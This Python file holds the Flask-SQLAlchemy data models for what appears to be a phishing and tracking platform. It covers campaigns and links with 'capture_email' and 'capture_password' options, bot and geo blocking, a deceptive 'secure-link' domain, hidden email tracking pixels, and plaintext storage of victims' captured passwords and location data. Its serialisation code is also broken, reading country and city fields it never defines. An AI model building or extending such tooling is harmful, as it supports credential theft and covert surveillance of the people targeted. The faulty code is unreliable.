from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime
import secrets
import string

db = SQLAlchemy()

class User(db.Model):
    __tablename__ = 'users'
    
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(255), nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    # Relationships
    campaigns = db.relationship('Campaign', backref='user', lazy=True, cascade='all, delete-orphan')
    links = db.relationship('Link', backref='user', lazy=True, cascade='all, delete-orphan')
    
    def set_password(self, password):
        self.password_hash = generate_password_hash(password)
    
    def check_password(self, password):
        return check_password_hash(self.password_hash, password)
    
    def to_dict(self):
        return {
            'id': self.id,
            'username': self.username,
            'email': self.email,
            'created_at': self.created_at.isoformat() if self.created_at else None
        }

class Campaign(db.Model):
    __tablename__ = 'campaigns'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
    name = db.Column(db.String(255), nullable=False)
    description = db.Column(db.Text, nullable=True)
    total_links = db.Column(db.Integer, default=0)
    total_clicks = db.Column(db.Integer, default=0)
    real_visitors = db.Column(db.Integer, default=0)
    blocked_attempts = db.Column(db.Integer, default=0)
    captured_emails = db.Column(db.Integer, default=0)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    # Relationships
    links = db.relationship('Link', backref='campaign', lazy=True, cascade='all, delete-orphan')
    
    def to_dict(self):
        return {
            'id': self.id,
            'name': self.name,
            'description': self.description,
            'total_links': self.total_links,
            'total_clicks': self.total_clicks,
            'real_visitors': self.real_visitors,
            'blocked_attempts': self.blocked_attempts,
            'captured_emails': self.captured_emails,
            'created_at': self.created_at.isoformat() if self.created_at else None
        }

class Link(db.Model):
    __tablename__ = 'links'
    
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'), nullable=False)
    campaign_id = db.Column(db.Integer, db.ForeignKey('campaigns.id'), nullable=True)
    
    # Link details
    short_code = db.Column(db.String(10), unique=True, nullable=False)
    target_url = db.Column(db.Text, nullable=False)
    title = db.Column(db.String(255), nullable=True)
    
    # URLs
    tracking_url = db.Column(db.Text, nullable=True)  # Full tracking URL
    pixel_url = db.Column(db.Text, nullable=True)     # Pixel tracking URL
    email_code = db.Column(db.Text, nullable=True)    # Email tracking code
    
    # Statistics
    total_clicks = db.Column(db.Integer, default=0)
    real_visitors = db.Column(db.Integer, default=0)
    blocked_attempts = db.Column(db.Integer, default=0)
    
    # Security settings
    capture_email = db.Column(db.Boolean, default=False)
    capture_password = db.Column(db.Boolean, default=False)
    bot_blocking_enabled = db.Column(db.Boolean, default=True)
    geo_targeting_enabled = db.Column(db.Boolean, default=False)
    rate_limiting_enabled = db.Column(db.Boolean, default=False)
    
    # Geographic filtering
    allowed_countries = db.Column(db.Text, nullable=True)  # JSON string
    blocked_countries = db.Column(db.Text, nullable=True)  # JSON string
    allowed_cities = db.Column(db.Text, nullable=True)     # JSON string
    blocked_cities = db.Column(db.Text, nullable=True)     # JSON string
    
    # Email tracking
    recipient_email = db.Column(db.String(255), nullable=True)
    
    # Timestamps
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    # Relationships
    events = db.relationship('TrackingEvent', backref='link', lazy=True, cascade='all, delete-orphan')
    
    def generate_short_code(self):
        """Generate a unique short code for the link"""
        while True:
            code = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(8))
            if not Link.query.filter_by(short_code=code).first():
                return code
    
    def generate_urls(self, base_url="https://secure-link.vercel.app"):
        """Generate tracking URL, pixel URL, and email code"""
        if not self.short_code:
            self.short_code = self.generate_short_code()
        
        # Tracking URL
        self.tracking_url = f"{base_url}/t/{self.short_code}"
        
        # Pixel URL with email parameter
        self.pixel_url = f"{base_url}/p/{self.short_code}?uid={{email}}"
        
        # Email tracking code (HTML img tag)
        self.email_code = f'<img src="{base_url}/p/{self.short_code}?uid={{email}}" width="1" height="1" style="display:none;">'
    
    def to_dict(self):
        return {
            'id': self.id,
            'short_code': self.short_code,
            'target_url': self.target_url,
            'title': self.title,
            'tracking_url': self.tracking_url,
            'pixel_url': self.pixel_url,
            'email_code': self.email_code,
            'total_clicks': self.total_clicks,
            'real_visitors': self.real_visitors,
            'blocked_attempts': self.blocked_attempts,
            'capture_email': self.capture_email,
            'capture_password': self.capture_password,
            'bot_blocking_enabled': self.bot_blocking_enabled,
            'geo_targeting_enabled': self.geo_targeting_enabled,
            'rate_limiting_enabled': self.rate_limiting_enabled,
            'allowed_countries': self.allowed_countries,
            'blocked_countries': self.blocked_countries,
            'recipient_email': self.recipient_email,
            'campaign_id': self.campaign_id,
            'created_at': self.created_at.isoformat() if self.created_at else None
        }

class TrackingEvent(db.Model):
    __tablename__ = 'tracking_events'
    
    id = db.Column(db.Integer, primary_key=True)
    link_id = db.Column(db.Integer, db.ForeignKey('links.id'), nullable=False)
    
    # Event details
    event_type = db.Column(db.String(50), nullable=False)  # 'click', 'open', 'pixel'
    ip_address = db.Column(db.String(45), nullable=True)
    user_agent = db.Column(db.Text, nullable=True)
    referer = db.Column(db.Text, nullable=True)
    
    # Geographic data
    region = db.Column(db.String(100), nullable=True)
    zip_code = db.Column(db.String(20), nullable=True)
    isp = db.Column(db.String(255), nullable=True)

    # Device information
    device_type = db.Column(db.String(50), nullable=True)  # 'Desktop', 'Mobile', 'Tablet'
    browser = db.Column(db.String(100), nullable=True)
    os = db.Column(db.String(100), nullable=True)
    
    # Tracking data
    captured_email = db.Column(db.String(255), nullable=True)
    captured_password = db.Column(db.String(255), nullable=True)
    
    # Security flags
    is_bot = db.Column(db.Boolean, default=False)
    is_proxy = db.Column(db.Boolean, default=False)
    is_blocked = db.Column(db.Boolean, default=False)
    
    # Status
    status = db.Column(db.String(50), default='active')  # 'active', 'redirected', 'blocked'
    
    # Timestamp
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    
    def to_dict(self):
        return {
            'id': self.id,
            'link_id': self.link_id,
            'event_type': self.event_type,
            'ip_address': self.ip_address,
            'user_agent': self.user_agent,
            'country': self.country,
            'country_code': self.country_code,
            'city': self.city,
            'region': self.region,
            'zip_code': self.zip_code,
            'isp': self.isp,
            'device_type': self.device_type,
            'browser': self.browser,
            'os': self.os,
            'captured_email': self.captured_email,
            'is_bot': self.is_bot,
            'is_proxy': self.is_proxy,
            'is_blocked': self.is_blocked,
            'status': self.status,
            'timestamp': self.timestamp.isoformat() if self.timestamp else None
        }

class SecurityThreat(db.Model):
    __tablename__ = 'security_threats'
    
    id = db.Column(db.Integer, primary_key=True)
    ip_address = db.Column(db.String(45), nullable=False)
    threat_type = db.Column(db.String(100), nullable=False)  # 'bot', 'proxy', 'spam', 'malicious'
    severity = db.Column(db.String(20), default='medium')    # 'low', 'medium', 'high', 'critical'
    description = db.Column(db.Text, nullable=True)
    country = db.Column(db.String(100), nullable=True)
    user_agent = db.Column(db.Text, nullable=True)
    blocked_count = db.Column(db.Integer, default=1)
    is_blocked = db.Column(db.Boolean, default=True)
    first_seen = db.Column(db.DateTime, default=datetime.utcnow)
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
    
    def to_dict(self):
        return {
            'id': self.id,
            'ip_address': self.ip_address,
            'threat_type': self.threat_type,
            'severity': self.severity,
            'description': self.description,
            'country': self.country,
            'blocked_count': self.blocked_count,
            'is_blocked': self.is_blocked,
            'first_seen': self.first_seen.isoformat() if self.first_seen else None,
            'last_seen': self.last_seen.isoformat() if self.last_seen else None
        }